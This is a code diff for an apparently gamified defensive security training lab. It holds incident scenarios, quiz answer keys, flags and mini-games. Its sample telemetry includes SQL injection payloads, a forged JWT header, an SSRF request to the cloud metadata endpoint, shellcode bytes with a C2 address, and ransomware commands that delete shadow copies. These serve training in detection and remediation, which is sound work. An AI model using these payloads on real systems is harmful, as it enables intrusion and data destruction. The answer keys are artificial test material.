+      question: "Decode the combined Base64 payload carved from the DNS queries and enter the extracted asset name:",
+      type: "flag",
+      correctFlag: "2026_staff_passwords_v1",
+      explanation: "Decoding 'dGVzdC1jcmVkcwoMjAyNl9zdGFmZl9wYXNzd29yZHNfdjEK' reveals 'test-creds 2026_staff_passwords_v1'. Attackers bypass outbound firewalls by leveraging DNS port 53 to slowly exfiltrate files chunk-by-chunk."
+    },
+    {
+      id: "sc-04",
+      tier: "t2",
+      tierLabel: "Tier 2: Web & Cloud",
+      severity: "critical",
+      title: "Time-Based Blind SQLi in Checkout API",
+      desc: "API logs for '/api/v1/sacco/verify' reveal suspicious latency spikes of 5,000ms. Analyze the injection vector and provide the parameterized defense.",
+      skills: ["SQLi", "Blind Timing", "Prepared Statements", "WAF Bypass"],
+      xp: 350,
+      brief: "Attacker sent payload: `member_id=2049' WAITFOR DELAY '0:0:5'--` and observed an exact 5-second HTTP response delay, confirming unescaped database string concatenation.",
+      telemetry: `POST /api/v1/sacco/verify HTTP/1.1
+Host: api.vunvault-fintech.internal
+Content-Type: application/json
+
+{"account":"KE-9011","member_id":"2049' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -"}
+
+HTTP/1.1 200 OK
+X-Response-Time: 5042ms
+Content-Type: application/json
+{"status":"active"}`,
+      question: "Which design pattern is the ONLY guaranteed architectural remediation against this attack?",
+      type: "radio",
+      options: [
+        { id: "a", text: "Blacklisting the word 'SLEEP' and single quotes in the web application" },
+        { id: "b", text: "Parameterized queries (Prepared Statements) with strictly typed bound parameters", correct: true },
+        { id: "c", text: "Increasing database CPU allocation to make queries execute faster" },
+        { id: "d", text: "Switching from POST to GET requests" }
+      ],
+      flagRequirement: null,
+      explanation: "Prepared Statements treat user input strictly as literal data, never as executable code. WAF keyword filters (e.g. stripping 'SLEEP') are consistently bypassed using alternative functions (BENCHMARK, pg_sleep, hex encoding)."
+    },
+    {
+      id: "sc-05",
+      tier: "t2",
+      tierLabel: "Tier 2: Web & Cloud",
+      severity: "high",
+      title: "JWT Algorithm Confusion & Key Tampering",
+      desc: "A client modified their session JWT header from 'alg: RS256' to 'alg: HS256', signing the token with the server's public key to gain 'role: superadmin'.",
+      skills: ["JWT", "Asymmetric Crypto", "Signature Verification", "Auth Bypass"],
+      xp: 280,
+      brief: "The application verified RS256 using an RSA public key. When the attacker changed the algorithm header to HMAC-SHA256 (HS256), the insecure library treated the public key string as the HMAC symmetric secret!",
+      telemetry: `Attacker Crafted Header:
+{"alg":"HS256","typ":"JWT"}
+
+Attacker Payload:
+{"sub":"vun_user_882","role":"superadmin","iat":1789401200}
+
+Verification Code:
+jwt.verify(token, publicKey); // Vulnerable to alg substitution!`,
+      question: "How do you patch this critical authentication vulnerability in the JWT verification logic?",
+      type: "radio",
+      options: [
+        { id: "a", text: "Explicitly restrict allowed algorithms: `algorithms: ['RS256']` during verification", correct: true },
+        { id: "b", text: "Base64 encode the public key twice" },
+        { id: "c", text: "Change the token expiration time to 30 seconds" },
+        { id: "d", text: "Remove the 'typ' header property from the token" }
+      ],
+      flagRequirement: null,
+      explanation: "Always whitelist acceptable algorithms explicitly (e.g., `algorithms: ['RS256']`). Never let an incoming, untrusted token header determine which cryptographic algorithm your verification engine executes."
+    },
+    {
+      id: "sc-06",
+      tier: "t2",
+      tierLabel: "Tier 2: Web & Cloud",
+      severity: "critical",
+      title: "SSRF to Cloud Metadata Token Theft (IMDSv1)",
+      desc: "An attacker exploits an image import feature to query 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'. Extract the leaked role and identify IMDSv2 defense.",
+      skills: ["SSRF", "Cloud Metadata", "AWS IMDSv2", "IAM Protection"],
+      xp: 320,
+      brief: "The web app accepts a URL to generate document previews: `GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vunvault-prod-role`.",
+      telemetry: `HTTP Response from Metadata Service:
+{
+  "Code" : "Success",
+  "LastUpdated" : "2026-09-15T20:12:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA3VUNVAULTEXAMPLE",
+  "SecretAccessKey" : "9xk18+exampleSecretKeyForVunVaultSocRange",
+  "Token" : "AQoDY3Jhd2w...[FLAG: VUNVAULT{imds_v2_session_token_required}]"
+}`,
+      question: "Enter the security token flag extracted from the compromised metadata output:",
+      type: "flag",
+      correctFlag: "VUNVAULT{imds_v2_session_token_required}",
+      explanation: "IMDSv1 is vulnerable to simple GET SSRF. Enforcing IMDSv2 requires an initial PUT request with a header `X-aws-ec2-metadata-token-ttl-seconds: 21600` to retrieve a session token, which generic SSRF vulnerabilities cannot execute."
+    },
+    {
+      id: "sc-07",
+      tier: "t3",
+      tierLabel: "Tier 3: APT & Incident Response",
+      severity: "critical",
+      title: "Cobalt Strike Memory Beacon & Process Hollowing",
+      desc: "A legitimate Windows process (`svchost.exe`) exhibits irregular thread creation, RWX memory allocations, and jittered HTTP beaconing to a Russian bulletproof host.",
+      skills: ["Memory Forensics", "Process Hollowing", "C2 Jitter", "Volatility"],
+      xp: 450,
+      brief: "Memory dump analysis with Volatility 3 reveals a hollowed `svchost.exe` (PID 4812). Injected shellcode starts with `FC 48 83 E4 F0` (standard 64-bit shellcode prologue) and invokes `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`.",
+      telemetry: `VOLATILITY 3 MALFIND OUTPUT:
+PID: 4812 (svchost.exe)
+Process Create Time: 2026-09-14 22:18:04
+Virtual Address: 0x0000021c90f20000
+Protection: PAGE_EXECUTE_READWRITE (RWX)
+Hex Carve:
+fc 48 83 e4 f0 e8 c8 00 00 00 41 51 41 50 52 51  .H...e..AQAPRQ
+56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52  VH1.eH.R'H.R.H.R
+C2 Config Extracted:
+Beacon Server: 194.87.139.42:443
+Watermark: 305419896
+Jitter: 22%`,
+      question: "What is the primary indicator of process injection found in the svchost.exe memory space?",
+      type: "radio",
+      options: [
+        { id: "a", text: "The process is running under the SYSTEM account" },
+        { id: "b", text: "An unmapped private memory region marked with PAGE_EXECUTE_READWRITE (RWX) permissions", correct: true },
+        { id: "c", text: "The process is communicating over port 443" },
+        { id: "d", text: "The process uptime is over 14 days" }
+      ],
+      flagRequirement: null,
+      explanation: "Legitimate Windows binaries never execute code from dynamically allocated memory with PAGE_EXECUTE_READWRITE (RWX) without backing DLL files on disk. This is the classic signature of process hollowing or reflective DLL injection."
+    },
+    {
+      id: "sc-08",
+      tier: "t3",
+      tierLabel: "Tier 3: APT & Incident Response",
+      severity: "critical",
+      title: "Kerberoasting & RC4-HMAC Ticket Carving",
+      desc: "Active Directory Event ID 4769 indicates a service ticket (TGS) requested with weak encryption type 0x17 (RC4-HMAC) for service account 'MSSQLSvc/sql01.corp'.",
+      skills: ["Active Directory", "Kerberoasting", "RC4-HMAC", "Event ID 4769"],
+      xp: 400,
+      brief: "Any authenticated domain user can request a Kerberos service ticket for any Service Principal Name (SPN). Because the ticket is encrypted with the service account's password hash, offline cracking can extract plain-text service passwords.",
+      telemetry: `Event ID: 4769 (A Kerberos service ticket was requested)
+TargetUserName: MSSQLSvc/sql01.corp.vunvault.internal:1433
+ServiceName: svc-database-prod
+Ticket Options: 0x40810000
+Ticket Encryption Type: 0x17 (RC4-HMAC - WEAK/VULNERABLE)
+Client Address: ::ffff:10.10.10.42`,
+      question: "Which two architectural mitigations effectively neutralize Kerberoasting across the enterprise domain?",
+      type: "radio",
+      options: [
+        { id: "a", text: "Migrate service accounts to Group Managed Service Accounts (gMSA) with 120-char passwords & enforce AES256 (0x12) encryption", correct: true },
+        { id: "b", text: "Change the domain functional level to Windows 2003" },
+        { id: "c", text: "Disable Kerberos and switch all domain logins to NTLMv1" },
+        { id: "d", text: "Set service passwords to expire every 24 hours" }
+      ],
+      flagRequirement: null,
+      explanation: "Group Managed Service Accounts (gMSA) use complex, automatically rotated 120-character passwords that cannot be cracked offline via hashcat/John, and enforcing AES256 eliminates weak RC4-HMAC encryption."
+    },
+    {
+      id: "sc-09",
+      tier: "t3",
+      tierLabel: "Tier 3: APT & Incident Response",
+      severity: "critical",
+      title: "Double-Extortion Ransomware Lateral Movement",
+      desc: "Emergency alert: Host 'DC-BACKUP-01' reports volume shadow copies deleted via `vssadmin delete shadows /all /quiet`. Ransomware binary is staging via WMI.",
+      skills: ["Ransomware IR", "Containment Tree", "Vssadmin", "Network Isolation"],
+      xp: 500,
+      brief: "The adversary compromised the domain backup coordinator. Threat telemetry confirms scheduled tasks created across 12 servers executing `wmic process call create 'powershell.exe -w hidden -enc ...'`. Your first 5 minutes decide whether the organization survives.",
+      telemetry: `22:45:01 UTC - Process Create: vssadmin.exe delete shadows /all /quiet
+22:45:03 UTC - Process Create: bcdedit.exe /set {default} recoveryenabled No
+22:45:04 UTC - Process Create: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+22:45:10 UTC - Network Spike: Port 445 SMB outbound to 10.10.30.0/24 (Database Subnet)
+Ransom note dropped: VUN_RECOVERY_README.txt
+Flag hint in note footer: [FLAG: VUNVAULT{isolate_vlan_kill_wmi_pivot}]`,
+      question: "What is the MANDATORY immediate first action for the Incident Response team upon detecting this command sequence?",
+      type: "radio",
+      options: [
+        { id: "a", text: "Immediately isolate the management and backup VLANs from the core switch and disable Active Directory remote WMI / WinRM access", correct: true },
+        { id: "b", text: "Send an email to all staff asking who clicked a link" },
+        { id: "c", text: "Format the hard drives immediately" },
+        { id: "d", text: "Pay the ransom quickly before price increases" }
+      ],
+      flagRequirement: null,
+      explanation: "Immediate network-level isolation of compromised subnets, disconnecting backup networks, and disabling administrative pivot protocols (WMI, SMB, WinRM) halts the lateral encryption propagation before mission-critical databases are encrypted."
+    }
+  ];
+
+  /* ============ RENDER SCENARIOS ============ */
+  function renderScenarios(filter = 'all', searchQuery = '') {
+    const container = document.getElementById('scenariosContainer');
+    if (!container) return;
+    container.innerHTML = '';
+
+    const filtered = SCENARIOS.filter(sc => {
+      const matchFilter = filter === 'all' || sc.tier === filter;
+      const matchSearch = !searchQuery || 
+        sc.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
+        sc.desc.toLowerCase().includes(searchQuery.toLowerCase()) ||
+        sc.skills.some(s => s.toLowerCase().includes(searchQuery.toLowerCase()));
+      return matchFilter && matchSearch;
+    });
+
+    if (filtered.length === 0) {
+      container.innerHTML = '<div style="grid-column: 1/-1; text-align:center; padding:40px; color:var(--text-sub); font-family:var(--font-mono);">No threat scenarios matched your filter query.</div>';
+      return;
+    }
+
+    filtered.forEach(sc => {
+      const isDone = STATE.completedScenarios.includes(sc.id);
+      const card = document.createElement('div');
+      card.className = `scenario-card ${isDone ? 'completed' : ''}`;
+      card.innerHTML = `
+        <div>
+          <div class="card-header-meta">
+            <span class="tag-severity sev-${sc.severity}">${sc.severity}</span>
+            <span class="tag-tier">${sc.tierLabel}</span>
+            <span class="tag-xp">+${sc.xp} XP</span>
+          </div>
+          <h3 class="scenario-title">${sc.title}</h3>
+          <p class="scenario-desc">${sc.desc}</p>
+          <div class="scenario-skills">
+            ${sc.skills.map(s => `<span class="skill-badge">${s}</span>`).join('')}
+          </div>
+        </div>
+        <div class="card-footer">
+          <button class="btn-launch" onclick="openScenarioModal('${sc.id}')">
+            <span>${isDone ? 'RE-EXAMINE INCIDENT' : 'INVESTIGATE & DEFEND'}</span>
+            <span>→</span>
+          </button>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+
+    // Update count badge
+    const badge = document.getElementById('badgeScenariosCount');
+    if (badge) badge.textContent = SCENARIOS.length;
+    const completedBadge = document.getElementById('statCompleted');
+    if (completedBadge) completedBadge.textContent = `${STATE.completedScenarios.length} / ${SCENARIOS.length}`;
+  }
+
+  // Filter pills
+  document.querySelectorAll('.filter-pill').forEach(pill => {
+    pill.addEventListener('click', () => {
+      document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
+      pill.classList.add('active');
+      const filter = pill.getAttribute('data-filter');
+      const search = document.getElementById('scenarioSearchInput').value;
+      renderScenarios(filter, search);
+      SFX.click();
+    });
+  });
+
+  document.getElementById('scenarioSearchInput').addEventListener('input', (e) => {
+    const activeFilter = document.querySelector('.filter-pill.active').getAttribute('data-filter') || 'all';
+    renderScenarios(activeFilter, e.target.value);
+  });
+
+  /* ============ SCENARIO MODAL ============ */
+  window.openScenarioModal = function(id) {
+    const sc = SCENARIOS.find(s => s.id === id);
+    if (!sc) return;
+    
+    document.getElementById('modalScenarioTitle').textContent = `INCIDENT BRIEF: ${sc.title.toUpperCase()}`;
+    const content = document.getElementById('modalScenarioContent');
+    
+    const isDone = STATE.completedScenarios.includes(sc.id);
+
+    let interactionHTML = '';
+    if (sc.type === 'radio') {
+      interactionHTML = `
+        <div class="question-block">
+          <div class="q-title">${sc.question}</div>
+          <div class="options-list">
+            ${sc.options.map((opt, i) => `
+              <label class="opt-label">
+                <input type="radio" name="sc_opt" value="${opt.id}" ${opt.correct && isDone ? 'checked' : ''}>
+                <span>${opt.text}</span>
+              </label>
+            `).join('')}
+          </div>
+          <button class="btn-verify" onclick="submitScenarioChoice('${sc.id}')">VERIFY DEFENSE ACTION</button>
+        </div>
+      `;
+    } else if (sc.type === 'flag') {
+      interactionHTML = `
+        <div class="question-block">
+          <div class="q-title">${sc.question}</div>
+          <div class="flag-input-group">
+            <input type="text" id="flagInputVal" placeholder="Enter extracted flag or asset name..." value="${isDone ? sc.correctFlag : ''}">
+            <button class="btn-verify" onclick="submitScenarioFlag('${sc.id}')">SUBMIT FORENSIC ARTIFACT</button>
+          </div>
+        </div>
+      `;
+    }
+
+    content.innerHTML = `
+      <div class="brief-section">
+        <div class="brief-header">⚡ INCIDENT SUMMARY & INTELLIGENCE</div>
+        <p style="color:var(--text-main); font-size:0.92rem; line-height:1.6;">${sc.brief}</p>
+      </div>
+
+      <div class="brief-section">
+        <div class="brief-header">📡 RAW CAPTURE & TELEMETRY STREAM</div>
+        <div class="telemetry-box">${sc.telemetry}</div>
+      </div>
+
+      ${interactionHTML}
+
+      <div class="feedback-banner" id="modalFeedback"></div>
+    `;
+
+    document.getElementById('scenarioModal').classList.add('open');
+    SFX.click();
+  };
+
+  window.closeScenarioModal = function() {
+    document.getElementById('scenarioModal').classList.remove('open');
+    SFX.click();
+  };
+
+  window.submitScenarioChoice = function(id) {
+    const sc = SCENARIOS.find(s => s.id === id);
+    if (!sc) return;
+    const selected = document.querySelector('input[name="sc_opt"]:checked');
+    const fb = document.getElementById('modalFeedback');
+
+    if (!selected) {
+      fb.className = 'feedback-banner error';
+      fb.textContent = 'Select an investigative remediation option first.';
+      fb.style.display = 'block';
+      SFX.error();
+      return;
+    }
+
+    const opt = sc.options.find(o => o.id === selected.value);
+    if (opt && opt.correct) {
+      fb.className = 'feedback-banner success';
+      fb.innerHTML = `<b>TACTICAL ACTION VERIFIED (+${sc.xp} XP):</b> ${sc.explanation}`;
+      fb.style.display = 'block';
+      awardXP(sc.xp, sc.id);
+      SFX.success();
+    } else {
+      fb.className = 'feedback-banner error';
+      fb.innerHTML = `<b>INCORRECT DEFENSE MITIGATION:</b> Adversary bypassed remediation. Review telemetry carefully and retry.`;
+      fb.style.display = 'block';
+      SFX.error();
+    }
+  };
+
+  window.submitScenarioFlag = function(id) {
+    const sc = SCENARIOS.find(s => s.id === id);
+    if (!sc) return;
+    const val = (document.getElementById('flagInputVal').value || '').trim();
+    const fb = document.getElementById('modalFeedback');
+
+    if (val.toLowerCase() === sc.correctFlag.toLowerCase()) {
+      fb.className = 'feedback-banner success';
+      fb.innerHTML = `<b>FLAG VERIFIED (+${sc.xp} XP):</b> ${sc.explanation}`;
+      fb.style.display = 'block';
+      awardXP(sc.xp, sc.id);
+      SFX.success();
+    } else {
+      fb.className = 'feedback-banner error';
+      fb.textContent = 'INVALID ARTIFACT / FLAG: Check encoding, padding, and case sensitivity.';
+      fb.style.display = 'block';
+      SFX.error();
+    }
+  };
+
+  /* ============ XP & REPUTATION ENGINE ============ */
+  function awardXP(amount, scenarioId) {
+    if (scenarioId && !STATE.completedScenarios.includes(scenarioId)) {
+      STATE.completedScenarios.push(scenarioId);
+      localStorage.setItem('vv_lab_completed', JSON.stringify(STATE.completedScenarios));
+    }
+    STATE.xp += amount;
+    localStorage.setItem('vv_lab_xp', STATE.xp);
+    updateXPUI();
+    checkBadges();
+    renderScenarios(document.querySelector('.filter-pill.active').getAttribute('data-filter') || 'all');
+  }
+
+  function updateXPUI() {
+    const xpText = document.getElementById('playerXPText');
+    const xpBar = document.getElementById('playerXPBar');
+    const rankEl = document.getElementById('playerRank');
+    const clearanceEl = document.getElementById('statClearance');
+
+    let rank = 'TIER 1 ANALYST';
+    let level = 'LEVEL 1';
+    let maxXP = 500;
+
+    if (STATE.xp >= 2000) {
+      rank = 'CYBER WARFARE COMMANDER';
+      level = 'LEVEL 5';
+      maxXP = 3000;
+    } else if (STATE.xp >= 1200) {
+      rank = 'LEAD THREAT HUNTER';
+      level = 'LEVEL 4';
+      maxXP = 2000;
+    } else if (STATE.xp >= 600) {
+      rank = 'INCIDENT RESPONDER';
+      level = 'LEVEL 3';
+      maxXP = 1200;
+    } else if (STATE.xp >= 300) {
+      rank = 'SOC OPERATOR';
+      level = 'LEVEL 2';
+      maxXP = 600;
+    }
+
+    if (rankEl) rankEl.textContent = rank;
+    if (clearanceEl) clearanceEl.textContent = level;
+    if (xpText) xpText.textContent = `${STATE.xp} / ${maxXP} XP`;
+    if (xpBar) {
+      const pct = Math.min(100, Math.floor((STATE.xp / maxXP) * 100));
+      xpBar.style.width = `${pct}%`;
+    }
+  }
+
+  /* ============ BADGES REPUTATION SYSTEM ============ */
+  const ALL_BADGES = [
+    { id: "recruit", name: "Recruit Operator", icon: "🛡️", desc: "Initiated VUNVAULT Security Lab" },
+    { id: "packet_sentinel", name: "Packet Sentinel", icon: "⚡", desc: "Dropped 10 threats in Firewall Sentinel" },
+    { id: "crypto_master", name: "Cipher Breaker", icon: "🔐", desc: "Cracked all cryptographic challenges" },
+    { id: "root_hunter", name: "Root Hunter", icon: "💻", desc: "Completed Terminal CTF shadow beacon" },
+    { id: "network_shield", name: "Perimeter Shield", icon: "🌐", desc: "Defended all Tier 1 perimeter scenarios" },
+    { id: "apt_slayer", name: "APT Slayer", icon: "⚔️", desc: "Defended Tier 3 memory & ransomware attacks" }
+  ];
+
+  function checkBadges() {
+    let unlockedAny = false;
+    if (STATE.fwScore >= 10 && !STATE.badges.includes("packet_sentinel")) {
+      STATE.badges.push("packet_sentinel");
+      unlockedAny = true;
+    }
+    if (STATE.completedScenarios.filter(id => ["sc-01","sc-02","sc-03"].includes(id)).length === 3 && !STATE.badges.includes("network_shield")) {
+      STATE.badges.push("network_shield");
+      unlockedAny = true;
+    }
+    if (STATE.completedScenarios.filter(id => ["sc-07","sc-08","sc-09"].includes(id)).length === 3 && !STATE.badges.includes("apt_slayer")) {
+      STATE.badges.push("apt_slayer");
+      unlockedAny = true;
+    }
+
+    if (unlockedAny) {
+      localStorage.setItem('vv_lab_badges', JSON.stringify(STATE.badges));
+      renderBadges();
+    }
+  }
+
+  function renderBadges() {
+    const container = document.getElementById('badgesContainer');
+    if (!container) return;
+    container.innerHTML = ALL_BADGES.map(b => {
+      const isUnlocked = STATE.badges.includes(b.id);
+      return `
+        <div class="badge-item ${isUnlocked ? 'unlocked' : ''}">
+          <div class="badge-icon">${b.icon}</div>
+          <div class="badge-name">${b.name}</div>
+          <div class="badge-status">${isUnlocked ? 'EARNED ✓' : 'LOCKED'}</div>
+        </div>
+      `;
+    }).join('');
+  }
+
+  window.resetProgressPrompt = function() {
+    if (confirm("Reset all VUNVAULT Security Lab progress, XP, and badges back to initial baseline?")) {
+      localStorage.removeItem('vv_lab_xp');
+      localStorage.removeItem('vv_lab_completed');
+      localStorage.removeItem('vv_lab_badges');
+      STATE.xp = 0;
+      STATE.completedScenarios = [];
+      STATE.badges = ['recruit'];
+      updateXPUI();
+      renderScenarios();
+      renderBadges();
+      SFX.click();
+    }
+  };
+
+  /* ========================================================
+     GAME 1: FIREWALL SENTINEL (LIVE PACKET DEFENSE ARCADE)
+     ======================================================== */
+  const SAMPLE_PACKETS = [
+    { proto: "TCP", src: "185.220.101.5", dst: "10.0.0.8:80", payload: "GET /index.php?id=1' UNION SELECT 1,username,password FROM admin--", isThreat: true, desc: "SQLi Extraction Attack" },
+    { proto: "HTTPS", src: "196.201.214.50", dst: "10.0.0.4:443", payload: "TLSv1.3 Client Hello, Host: vunvault.com, SNI: vunvault.com", isThreat: false, desc: "Legitimate Corporate User" },
+    { proto: "TCP", src: "45.154.255.88", dst: "10.0.0.12:22", payload: "SSH-2.0-libssh_0.8.3 Brute Force: root / admin123", isThreat: true, desc: "SSH Credential Stuffing" },
+    { proto: "DNS", src: "8.8.8.8", dst: "10.0.0.2:53", payload: "DNS Standard Response: A vunvault.com -> 196.201.214.12", isThreat: false, desc: "Legitimate DNS Reply" },
+    { proto: "TCP", src: "91.240.118.172", dst: "10.0.0.5:445", payload: "SMBv1 Tree Connect [ETERNALBLUE SMB Header Exploit]", isThreat: true, desc: "MS17-010 EternalBlue Probe" },
+    { proto: "HTTP", src: "10.0.0.15", dst: "10.0.0.4:8080", payload: "GET /api/v1/healthz HTTP/1.1 User-Agent: Prometheus/2.37", isThreat: false, desc: "Internal Cluster Healthcheck" },
+    { proto: "TCP", src: "194.87.139.42", dst: "10.0.0.30:31337", payload: "SYN-FLOOD seq=000 win=1024 [DDOS AMPLIFICATION INCOMING]", isThreat: true, desc: "Volumetric SYN Flood" }
+  ];
+
+  window.launchGame = function(gameId) {
+    document.querySelectorAll('.active-game-stage').forEach(s => s.classList.remove('open'));
+    const stage = document.getElementById(`game-stage-${gameId}`);
+    if (stage) {
+      stage.classList.add('open');
+      stage.scrollIntoView({ behavior: 'smooth' });
+    }
+    if (gameId === 'firewall') startFirewallGame();
+    if (gameId === 'crypto') startCryptoGame();
+    if (gameId === 'subnet') startSubnetGame();
+    SFX.click();
+  };
+
+  window.closeGameStage = function(gameId) {
+    const stage = document.getElementById(`game-stage-${gameId}`);
+    if (stage) stage.classList.remove('open');
+    SFX.click();
+  };
+
+  function startFirewallGame() {
+    STATE.fwScore = 0;
+    STATE.fwCombo = 1;
+    STATE.fwShields = 3;
+    updateFirewallStats();
+    nextFirewallPacket();
+  }
+
+  function updateFirewallStats() {
+    document.getElementById('fwScore').textContent = STATE.fwScore;
+    document.getElementById('fwCombo').textContent = `x${STATE.fwCombo}`;
+    const hearts = '❤️'.repeat(Math.max(0, STATE.fwShields));
+    document.getElementById('fwShields').textContent = hearts || '💀 COMPROMISED';
+    document.getElementById('statInterceptions').textContent = `${STATE.fwScore} PKTS`;
+  }
+
+  function nextFirewallPacket() {
+    if (STATE.fwShields <= 0) {
+      document.getElementById('packetArena').innerHTML = `
+        <div style="text-align:center; padding:30px; font-family:var(--font-mono); color:var(--danger);">
+          <h2 style="font-size:2rem; margin-bottom:8px;">GATEWAY COMPROMISED!</h2>
+          <p>Unmitigated threats overwhelmed internal servers. Final Defense Score: <b>${STATE.fwScore}</b></p>
+          <button class="btn-play-game" style="margin-top:16px;" onclick="startFirewallGame()">REDEPLOY FIREWALL</button>
+        </div>
+      `;
+      return;
+    }
+
+    const pkt = SAMPLE_PACKETS[Math.floor(Math.random() * SAMPLE_PACKETS.length)];
+    STATE.activePacket = pkt;
+
+    const arena = document.getElementById('packetArena');
+    arena.innerHTML = `
+      <div class="packet-card-active ${pkt.isThreat ? 'threat' : ''}">
+        <div class="packet-info-main">
+          <span class="packet-proto">${pkt.proto}</span>
+          <div class="packet-ips">${pkt.src} → ${pkt.dst}</div>
+          <div class="packet-payload"><code>${pkt.payload}</code></div>
+        </div>
+        <div style="font-size:0.75rem; text-align:right;">
+          <span style="color:${pkt.isThreat ? 'var(--danger)' : 'var(--success)'}; font-weight:700;">
+            ${pkt.isThreat ? '⚠️ SUSPICIOUS TRAFFIC' : '🟢 VERIFIED FLOW'}
+          </span>
+        </div>
+      </div>
+    `;
+  }
+
+  window.playerDecidePacket = function(allow) {
+    if (!STATE.activePacket || STATE.fwShields <= 0) return;
+    const pkt = STATE.activePacket;
+
+    if (pkt.isThreat && !allow) {
+      // Correctly dropped threat
+      STATE.fwScore += 10 * STATE.fwCombo;
+      STATE.fwCombo += 1;
+      awardXP(15);
+      SFX.laserDrop();
+    } else if (!pkt.isThreat && allow) {
+      // Correctly allowed good traffic
+      STATE.fwScore += 5;
+      awardXP(5);
+      SFX.success();
+    } else {
+      // Mistake!
+      STATE.fwShields -= 1;
+      STATE.fwCombo = 1;
+      SFX.error();
+    }
+
+    updateFirewallStats();
+    checkBadges();
+    setTimeout(nextFirewallPacket, 250);
+  };
+
+  // Keyboard shortcuts for firewall game
+  document.addEventListener('keydown', (e) => {
+    const stage = document.getElementById('game-stage-firewall');
+    if (!stage || !stage.classList.contains('open')) return;
+    if (e.key === ' ' || e.key.toLowerCase() === 'd') {
+      e.preventDefault();
+      playerDecidePacket(false);
+    } else if (e.key === 'Enter' || e.key.toLowerCase() === 'a') {
+      e.preventDefault();
+      playerDecidePacket(true);
+    }
+  });
+
+  /* ========================================================
+     GAME 2: HASH & CIPHER CRACKER
+     ======================================================== */
+  const CRYPTO_CHALLENGES = [
+    {
+      type: "rot",
+      title: "Stage 1: Ransomware C2 Instruction (Caesar / ROT Shift)",
+      ciphertext: "Gb fvyragyl rknfuvygbegr qngn, hfr cbeg 31337",
+      shift: 13,
+      correctDecryption: "To silently exfiltrate data, use port 31337",
+      hint: "Rotate the cipher slider until English words emerge."
+    },
+    {
+      type: "b64",
+      title: "Stage 2: Obfuscated PowerShell Download Cradle",
+      ciphertext: "VlVOVkFVTFR7cG93ZXJzaGVsbF9ieXBhc3NfZGVjb2RlZF94OTl9",
+      correctDecryption: "VUNVAULT{powershell_bypass_decoded_x99}",
+      hint: "Standard Base64 string encoded by an attacker loader."
+    },
+    {
+      type: "hex",
+      title: "Stage 3: Hex Encoded SQL Injection Payload",
+      ciphertext: "756e696f6e2073656c6563742070617373776f72642066726f6d207573657273",
+      correctDecryption: "union select password from users",
+      hint: "Hexadecimal byte stream (2 hex chars per ASCII character)."
+    }
+  ];
+
+  function startCryptoGame() {
+    STATE.cryptoStage = 0;
+    renderCryptoStage();
+  }
+
+  function renderCryptoStage() {
+    const box = document.getElementById('cryptoStageBox');
+    if (STATE.cryptoStage >= CRYPTO_CHALLENGES.length) {
+      box.innerHTML = `
+        <div style="text-align:center; padding:30px; font-family:var(--font-mono); color:var(--success);">
+          <h2 style="font-size:2rem;">CIPHER MATRIX CRACKED!</h2>
+          <p>You have decrypted all intercepted adversary payloads.</p>
+          <button class="btn-play-game" style="margin-top:16px;" onclick="startCryptoGame()">PLAY AGAIN</button>
+        </div>
+      `;
+      if (!STATE.badges.includes("crypto_master")) {
+        STATE.badges.push("crypto_master");
+        localStorage.setItem('vv_lab_badges', JSON.stringify(STATE.badges));
+        renderBadges();
+      }
+      return;
+    }
+
+    const c = CRYPTO_CHALLENGES[STATE.cryptoStage];
+    document.getElementById('cryptoStageNum').textContent = `${STATE.cryptoStage + 1} / ${CRYPTO_CHALLENGES.length}`;
+
+    if (c.type === 'rot') {
+      box.innerHTML = `
+        <h4 style="font-family:var(--font-mono); color:var(--primary);">${c.title}</h4>
+        <div class="cipher-ciphertext-display" id="rotCiphertext">${c.ciphertext}</div>
+        
+        <div class="slider-group">
+          <div class="slider-label">
+            <span>Shift Key: <b id="sliderVal">0</b></span>
+            <span>Target: Decrypt C2 instructions</span>
+          </div>
+          <input type="range" class="crypto-slider" id="rotSlider" min="0" max="25" value="0">
+        </div>
+
+        <div class="decrypted-preview-box" id="rotLivePreview">${c.ciphertext}</div>
+        <button class="btn-verify" onclick="verifyRotChallenge()">SUBMIT DECRYPTED INSTRUCTION</button>
+      `;
+
+      document.getElementById('rotSlider').addEventListener('input', (e) => {
+        const shift = parseInt(e.target.value, 10);
+        document.getElementById('sliderVal').textContent = shift;
+        const decrypted = rotShift(c.ciphertext, shift);
+        document.getElementById('rotLivePreview').textContent = decrypted;
+      });
+    } else {
+      box.innerHTML = `
+        <h4 style="font-family:var(--font-mono); color:var(--primary);">${c.title}</h4>
+        <div class="cipher-ciphertext-display">${c.ciphertext}</div>
+        <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:12px;">Hint: ${c.hint}</p>
+        
+        <div class="flag-input-group">
+          <input type="text" id="cryptoInputVal" placeholder="Enter plaintext result...">
+          <button class="btn-verify" onclick="verifyStaticCrypto()">VERIFY PLAINTEXT</button>
+        </div>
+      `;
+    }
+  }
+
+  function rotShift(str, shift) {
+    return str.replace(/[a-zA-Z]/g, function(c) {
+      const base = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode((c.charCodeAt(0) - base + shift) % 26 + base);
+    });
+  }
+
+  window.verifyRotChallenge = function() {
+    const c = CRYPTO_CHALLENGES[STATE.cryptoStage];
+    const preview = document.getElementById('rotLivePreview').textContent;
+    if (preview.toLowerCase() === c.correctDecryption.toLowerCase()) {
+      SFX.success();
+      awardXP(100);
+      STATE.cryptoStage++;
+      renderCryptoStage();
+    } else {
+      SFX.error();
+      alert("Decryption incorrect. Adjust shift slider until English text is readable.");
+    }
+  };
+
+  window.verifyStaticCrypto = function() {
+    const c = CRYPTO_CHALLENGES[STATE.cryptoStage];
+    const val = (document.getElementById('cryptoInputVal').value || '').trim();
+    if (val.toLowerCase() === c.correctDecryption.toLowerCase()) {
+      SFX.success();
+      awardXP(120);
+      STATE.cryptoStage++;
+      renderCryptoStage();
+    } else {
+      SFX.error();
+      alert("Invalid plaintext. Use the Forensics Toolkit tab to decode the payload.");
+    }
+  };
+
+  /* ========================================================
